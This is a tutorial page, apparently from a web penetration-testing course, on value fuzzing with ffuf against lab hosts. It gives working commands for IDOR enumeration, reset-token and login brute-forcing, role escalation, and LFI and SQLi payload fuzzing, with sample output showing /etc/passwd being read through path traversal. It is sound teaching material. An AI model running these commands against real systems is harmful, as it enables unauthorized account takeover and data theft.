---
title: "Value Fuzzing with Ffuf"
description: "Brute-force parameter values to exploit discovered parameters — ID enumeration, token guessing, injection payloads, and custom wordlists."
date: 2026-07-14
tags:
  - Ffuf
  - Web Attacks
  - Fuzzing
  - Reconnaissance
---

# Value Fuzzing

## From Discovery to Exploitation

Up to this point, you've been discovering **what exists** — directories, pages, parameters. Value fuzzing is where you shift from reconnaissance to exploitation. You know the parameter name; now you fuzz the **value** to extract data, bypass controls, or trigger vulnerabilities.

Use cases:

- **ID enumeration** — iterate user/resource IDs (`?id=1`, `?id=2`, ...)
- **Token brute-force** — guess reset tokens, API keys, session values
- **Injection testing** — feed payloads to known parameters (SQLi, XSS, LFI)
- **Access control bypass** — enumerate role values, hidden status codes
- **Password spraying** — test common passwords against a known username

---

## Basic Value Fuzzing Command

Place `FUZZ` in the **value** position (not the parameter name):

```shell
ffuf -w /tmp/values.txt:FUZZ \
     -u http://SERVER_IP:PORT/admin/admin.php -X POST \
     -d "id=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs 768
```

This sends:

- `id=1`
- `id=2`
- `id=admin`
- `id=test`
- ...

---

## Creating Custom Wordlists

Value fuzzing often requires purpose-built wordlists rather than generic ones.

### Numeric ID Ranges

```shell
# Generate IDs 1-1000
seq 1 1000 > /tmp/ids.txt

# Generate with zero-padding (001-999)
seq -w 1 999 > /tmp/padded-ids.txt

# Use directly in ffuf
ffuf -w /tmp/ids.txt:FUZZ \
     -u http://10.10.10.5:8080/admin/admin.php -X POST \
     -d "id=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs 768
```

### For GET parameters

```shell
ffuf -w /tmp/ids.txt:FUZZ \
     -u "http://10.10.10.5:8080/profile.php?id=FUZZ" -fs 2453
```

### Curl Equivalent (Verify Individual Results)

```shell
curl -s -X POST http://10.10.10.5:8080/admin/admin.php \
     -d "id=73" -H "Content-Type: application/x-www-form-urlencoded"
```

---

## Practical Scenarios

### Scenario 1: IDOR — User ID Enumeration

You discovered the `id` parameter accepts a user ID. Enumerate all valid IDs:

```shell
# Generate the wordlist
seq 1 500 > /tmp/user-ids.txt

# Fuzz
ffuf -w /tmp/user-ids.txt:FUZZ \
     -u "http://10.10.10.5:8080/api/user?id=FUZZ" -fs 0

________________________________________________

1                       [Status: 200, Size: 234, Words: 12, Lines: 5, Duration: 42ms]
2                       [Status: 200, Size: 241, Words: 12, Lines: 5, Duration: 41ms]
3                       [Status: 200, Size: 228, Words: 12, Lines: 5, Duration: 43ms]
51                      [Status: 200, Size: 312, Words: 18, Lines: 7, Duration: 44ms]
73                      [Status: 200, Size: 298, Words: 15, Lines: 6, Duration: 42ms]
```

IDs 1-3 and 51, 73 have valid user records. ID 51 and 73 have **different sizes** — potentially admin/privileged accounts with more data exposed.

### Scenario 2: Password Reset Token Guessing

If the reset token is a short numeric code:

```shell
# Generate 4-digit codes
seq -w 0000 9999 > /tmp/codes.txt

# Fuzz the token
ffuf -w /tmp/codes.txt:FUZZ \
     -u "http://10.10.10.5:8080/reset.php?token=FUZZ" -fs 1234
```

!!! warning "Token Length"
    This only works if the token space is small enough to brute-force. A 4-digit numeric token (10,000 combinations) is feasible. A 32-character hex token (16^32 combinations) is not. Always assess feasibility before investing time.

### Scenario 3: LFI Payload Fuzzing

You found a `file` parameter. Fuzz it with LFI payloads:

```shell
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u "http://10.10.10.5:8080/page.php?file=FUZZ" -fs 2453

________________________________________________

../../../etc/passwd     [Status: 200, Size: 4521, Words: 52, Lines: 34, Duration: 43ms]
....//....//....//etc/passwd [Status: 200, Size: 4521, Words: 52, Lines: 34, Duration: 44ms]
```

### Scenario 4: SQL Injection Payload Testing

```shell
ffuf -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt:FUZZ \
     -u "http://10.10.10.5:8080/search.php?q=FUZZ" -fs 3456 -fc 500

# Look for responses that are significantly larger (data exfil)
# or that return 500 (SQL error — confirms injection point)
```

!!! tip "Matching 500 Instead of Filtering"
    For SQL injection detection, you might WANT to see 500 errors (they confirm the injection point). Use `-mc 500` instead of `-fc 500`:
    ```shell
    ffuf -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt:FUZZ \
         -u "http://10.10.10.5:8080/search.php?q=FUZZ" -mc 500
    ```

### Scenario 5: Role/Privilege Escalation

```shell
# Create a role wordlist
cat << 'EOF' > /tmp/roles.txt
admin
administrator
root
superuser
manager
moderator
editor
operator
staff
developer
EOF

# Fuzz the role parameter
ffuf -w /tmp/roles.txt:FUZZ \
     -u http://10.10.10.5:8080/api/user/1 -X PUT \
     -d '{"role":"FUZZ"}' -H "Content-Type: application/json" \
     -H "Cookie: session=abc123" -fs 156
```

---

## Combining Known Parameters with Value Fuzzing

When you know multiple parameters, fix all but one and fuzz the value:

```shell
# You know: id parameter exists, user parameter exists
# Fuzz the user value while keeping id fixed
ffuf -w /usr/share/seclists/Usernames/Names/names.txt:FUZZ \
     -u http://10.10.10.5:8080/admin/admin.php -X POST \
     -d "id=1&user=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs 768
```

---

## Multi-Position Value Fuzzing

Fuzz two values simultaneously (clusterbomb mode):

```shell
# Brute-force login with username AND password lists
ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER \
     -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt:PASS \
     -u http://10.10.10.5:8080/login.php -X POST \
     -d "username=USER&password=PASS" \
     -H "Content-Type: application/x-www-form-urlencoded" -fs 1234

# Curl equivalent for verification
curl -s -X POST http://10.10.10.5:8080/login.php \
     -d "username=admin&password=password123"
```

!!! danger "Clusterbomb Explosion"
    Multi-position fuzzing multiplies wordlist sizes: 50 usernames × 10,000 passwords = **500,000 requests**. Use short, targeted lists. For real credential brute-forcing at scale, consider dedicated tools (Hydra, Medusa) with better rate-limiting support.

---

## Useful Wordlists for Value Fuzzing

| Wordlist | Path | Use Case |
|---|---|---|
| LFI payloads | `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt` | File inclusion testing |
| SQLi payloads | `/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt` | SQL injection detection |
| XSS payloads | `/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt` | Cross-site scripting |
| Common passwords | `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` | Auth brute-force |
| Usernames | `/usr/share/seclists/Usernames/Names/names.txt` | User enumeration |
| Top usernames | `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` | Quick user tests |
| Numeric IDs | Custom (`seq 1 1000`) | IDOR enumeration |
| Subdomains | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` | DNS value testing |

---

## Filtering Strategies for Value Fuzzing

Value fuzzing results often require different filtering than parameter discovery:

### Looking for "Success" Among Many Failures

```shell
# Login brute-force: failed login = 200 + "Invalid credentials" (size 1234)
# Successful login = 302 redirect
ffuf -w passwords.txt:FUZZ \
     -u http://10.10.10.5:8080/login.php -X POST \
     -d "user=admin&pass=FUZZ" -fc 200
# Shows only non-200 responses (302 = successful login)
```

### Looking for Data Among Empty Responses

```shell
# IDOR: invalid ID = empty (0 bytes), valid ID = user data
ffuf -w /tmp/ids.txt:FUZZ \
     -u "http://10.10.10.5:8080/api/user?id=FUZZ" -fs 0
```

### Looking for Errors (Injection Detection)

```shell
# SQLi: normal = 200 (size 3456), injected = 500 error
ffuf -w sqli-payloads.txt:FUZZ \
     -u "http://10.10.10.5:8080/search?q=FUZZ" -mc 500
```

---

## Output and Post-Processing

Save results for analysis:

```shell
ffuf -w /tmp/ids.txt:FUZZ \
     -u "http://10.10.10.5:8080/api/user?id=FUZZ" -fs 0 \
     -o idor-results.json -of json

# Extract found IDs from JSON
cat idor-results.json | jq -r '.results[].input.FUZZ'
```

---

!!! success "Revision Recap"
    - Value fuzzing exploits **known parameters** by brute-forcing their values
    - Place `FUZZ` in the value position: `?param=FUZZ` or `-d "param=FUZZ"`
    - **Build custom wordlists** for the scenario (numeric IDs, roles, payloads)
    - Common use cases: IDOR (ID enum), credential brute-force, injection testing, token guessing
    - Use targeted filtering: `-fs 0` for empty defaults, `-mc 500` for error detection, `-fc 200` for login brute-force
    - Multi-position fuzzing (clusterbomb) is powerful but **multiplicative** — keep lists short
    - Save results with `-o` and post-process with `jq` for structured analysis

---

➡️ **Next:** [Cheatsheet](cheatsheet.md) — all commands in one consolidated reference
